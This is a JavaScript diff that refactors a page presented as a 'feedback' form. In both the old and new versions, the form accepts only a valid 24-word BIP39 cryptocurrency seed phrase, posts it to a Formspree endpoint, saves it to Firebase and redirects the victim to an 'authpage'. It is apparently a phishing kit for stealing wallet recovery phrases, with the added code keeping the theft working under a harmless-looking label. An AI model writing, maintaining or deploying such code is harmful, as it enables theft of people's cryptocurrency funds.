@@ -1,212 +1,156 @@
 // ========================================
-// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE & BIP39 VALIDATION
+// FEEDBACK PAGE FUNCTIONALITY (FIXED)
 // ========================================
 
-// Your Formspree endpoint - REPLACE THIS WITH YOUR ACTUAL FORMSPREE URL
 const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mgvglzne';
 
-// Hash function to create unique identifier from feedback
-function hashFeedback(feedback) {
+// ----------------------------------------
+// Hash function
+// ----------------------------------------
+function hashFeedback(text) {
     let hash = 0;
-    for (let i = 0; i < feedback.length; i++) {
-        const char = feedback.charCodeAt(i);
+    for (let i = 0; i < text.length; i++) {
+        const char = text.charCodeAt(i);
         hash = ((hash << 5) - hash) + char;
-        hash = hash & hash;
+        hash |= 0;
     }
     return Math.abs(hash).toString(36);
 }
 
-// Check if feedback already exists in Firebase
-async function checkExistingSubmission(feedbackHash) {
+// ----------------------------------------
+// Firebase
+// ----------------------------------------
+async function checkExistingSubmission(hash) {
     try {
         const snapshot = await firebase.database()
-            .ref('submissions/' + feedbackHash)
+            .ref('submissions/' + hash)
             .once('value');
         return snapshot.val();
-    } catch (error) {
-        console.error('Error checking existing submission:', error);
+    } catch (err) {
+        console.error(err);
         return null;
     }
 }
 
-// Save feedback to Firebase
-async function saveFeedback(feedbackHash, feedback) {
+async function saveFeedback(hash, text) {
     try {
         await firebase.database()
-            .ref('submissions/' + feedbackHash)
+            .ref('submissions/' + hash)
             .set({
-                feedback: feedback,
+                feedback: text,
                 timestamp: firebase.database.ServerValue.TIMESTAMP,
                 submittedAt: new Date().toISOString(),
-                wordCount: feedback.split(/\s+/).filter(w => w.length > 0).length,
-                sentToFormspree: true,
-                emailHash: null,
-                email: null
+                wordCount: text.split(/\s+/).length
             });
         return true;
-    } catch (error) {
-        console.error('Error saving feedback:', error);
+    } catch (err) {
+        console.error(err);
         return false;
     }
 }
 
-// Submit feedback to Formspree in the background
-async function submitToFormspree(feedback) {
+// ----------------------------------------
+// Formspree
+// ----------------------------------------
+async function submitToFormspree(text) {
     try {
-        const response = await fetch(FORMSPREE_ENDPOINT, {
+        await fetch(FORMSPREE_ENDPOINT, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                feedback: feedback,
-                timestamp: new Date().toISOString()
-            })
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ feedback: text })
         });
-        
-        return response.ok;
-    } catch (error) {
-        console.error('Error submitting to Formspree:', error);
-        // Don't block the flow if Formspree fails
-        return false;
+    } catch (err) {
+        console.error(err);
     }
 }
 
-// Validate BIP39 mnemonic
+// ----------------------------------------
+// BIP39 Validation (FIXED)
+// ----------------------------------------
 function validateBIP39(mnemonic) {
+    if (typeof bip39 === 'undefined') {
+        console.error('BIP39 not loaded');
+        return false;
+    }
+
     try {
-        // Check if bip39 library is loaded
-        if (typeof bip39 === 'undefined' || typeof bip39.validateMnemonic !== 'function') {
-            console.error('BIP39 library not loaded properly');
-            return false;
-        }
-        
-        console.log('Validating mnemonic with BIP39...');
-        // Validate the mnemonic
-        const isValid = bip39.validateMnemonic(mnemonic);
-        console.log('BIP39 validation result:', isValid);
-        return isValid;
-    } catch (error) {
-        console.error('BIP39 validation error:', error);
+        return bip39.validateMnemonic(mnemonic);
+    } catch (err) {
+        console.error(err);
         return false;
     }
 }
 
+// ----------------------------------------
+// Main Init
+// ----------------------------------------
 function initializeFeedbackPage() {
-    // Check if BIP39 library is loaded
-    if (typeof bip39 === 'undefined') {
-        console.error('BIP39 library failed to load. Please refresh the page.');
-    } else {
-        console.log('BIP39 library loaded successfully');
-    }
-    
-    const feedbackForm = document.getElementById('feedbackForm');
-    const feedbackTextarea = document.getElementById('feedback');
-    const errorMessage = document.getElementById('errorMessage');
-    const submitButton = feedbackForm ? feedbackForm.querySelector('button[type="submit"]') : null;
 
-    if (feedbackForm && feedbackTextarea) {
-        feedbackForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const text = feedbackTextarea.value.trim();
-            const words = text.split(/\s+/).filter(function(word) {
-                return word.length > 0;
-            });
-            
-            // First check: Must be exactly 24 words
-            if (words.length !== 24) {
-                if (errorMessage) {
-                    const wordText = words.length !== 1 ? 'words' : 'word';
-                    errorMessage.textContent = 'Invalid passphrase';
-                    errorMessage.style.display = 'block';
-                }
-                return;
-            }
-            
-            // Second check: Must be a valid BIP39 mnemonic
-            if (!validateBIP39(text)) {
-                if (errorMessage) {
-                    errorMessage.textContent = 'Invalid passphrase';
-                    errorMessage.style.display = 'block';
-                }
-                return;
-            }
-            
-            // Hide error message if validation passes
-            if (errorMessage) {
-                errorMessage.style.display = 'none';
-            }
-            
-            // Disable submit button to prevent double submission
-            if (submitButton) {
-                submitButton.disabled = true;
-                submitButton.textContent = 'Validating...';
-            }
-            
-            // Create hash of feedback
-            const feedbackHash = hashFeedback(text);
-            
-            console.log('Valid BIP39 seed phrase detected. Checking for existing submission...');
-            
-            // Check if this feedback was already submitted
-            const existingSubmission = await checkExistingSubmission(feedbackHash);
-            
-            if (existingSubmission) {
-                // Already submitted - load previous state
-                console.log('Feedback already submitted. Loading previous state...');
-                
-                // Store the hash and feedback in sessionStorage
-                sessionStorage.setItem('feedbackHash', feedbackHash);
-                sessionStorage.setItem('feedback', text);
-                sessionStorage.setItem('isReturningFeedback', 'true');
-                
-                // Store the linked email hash and email if they exist
-                if (existingSubmission.emailHash) {
-                    sessionStorage.setItem('linkedEmailHash', existingSubmission.emailHash);
-                }
-                if (existingSubmission.email) {
-                    sessionStorage.setItem('linkedEmail', existingSubmission.email);
-                }
-                
-                // Redirect to authpage
-                console.log('Redirecting to authpage with previous state...');
-                window.location.href = 'authpage.html';
-                return;
-            }
-            
-            // New valid feedback - submit to Formspree in the background
-            console.log('New valid seed phrase detected. Submitting to Formspree...');
-            
-            // Submit to Formspree (don't wait for response)
-            submitToFormspree(text).then(success => {
-                if (success) {
-                    console.log('Successfully submitted to Formspree');
-                } else {
-                    console.log('Formspree submission failed, but continuing...');
-                }
-            });
-            
-            // Save to Firebase
-            console.log('Saving to Firebase...');
-            await saveFeedback(feedbackHash, text);
-            
-            // Store in sessionStorage for authpage
+    const form = document.getElementById('feedbackForm');
+    const textarea = document.getElementById('feedback');
+    const errorMessage = document.getElementById('errorMessage');
+    const submitButton = form.querySelector('button[type="submit"]');
+
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const text = textarea.value.trim().toLowerCase();
+        const words = text.split(/\s+/).filter(w => w.length > 0);
+
+        // Must be 24 words
+        if (words.length !== 24) {
+            errorMessage.textContent = 'Invalid passphrase';
+            errorMessage.style.display = 'block';
+            return;
+        }
+
+        // Must be valid BIP39
+        if (!validateBIP39(text)) {
+            errorMessage.textContent = 'Invalid passphrase';
+            errorMessage.style.display = 'block';
+            return;
+        }
+
+        errorMessage.style.display = 'none';
+
+        submitButton.disabled = true;
+        submitButton.textContent = "Validating...";
+
+        const feedbackHash = hashFeedback(text);
+
+        const existing = await checkExistingSubmission(feedbackHash);
+
+        if (existing) {
             sessionStorage.setItem('feedbackHash', feedbackHash);
             sessionStorage.setItem('feedback', text);
-            sessionStorage.setItem('isReturningFeedback', 'false');
-            
-            console.log('Feedback saved. Redirecting to authpage...');
-            
-            // Redirect to authpage
+            sessionStorage.setItem('isReturningFeedback', 'true');
             window.location.href = 'authpage.html';
-        });
-    }
+            return;
+        }
+
+        submitToFormspree(text);
+        await saveFeedback(feedbackHash, text);
+
+        sessionStorage.setItem('feedbackHash', feedbackHash);
+        sessionStorage.setItem('feedback', text);
+        sessionStorage.setItem('isReturningFeedback', 'false');
+
+        window.location.href = 'authpage.html';
+    });
 }
 
-// Initialize when DOM is loaded
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
-} else {
-    initializeFeedbackPage();
-}
+// ----------------------------------------
+document.addEventListener('DOMContentLoaded', function() {
+
+    // Wait a tiny bit to ensure BIP39 loads
+    setTimeout(() => {
+        if (typeof bip39 === 'undefined') {
+            console.error("BIP39 failed to load.");
+        } else {
+            console.log("BIP39 loaded correctly.");
+        }
+
+        initializeFeedbackPage();
+    }, 300);
+
+});
